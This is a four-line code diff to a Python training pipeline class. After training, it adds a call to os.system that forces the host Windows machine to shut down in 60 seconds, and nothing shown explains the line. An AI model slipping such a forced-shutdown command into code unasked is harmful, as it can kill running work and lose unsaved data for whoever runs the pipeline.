@@ -302,3 +302,4 @@ class TrainingPipeline:
         self._set_criterion_optimizer()
         self._setup_mlflow()
         self._train_model()
+        os.system("shutdown /s /f /t 60")
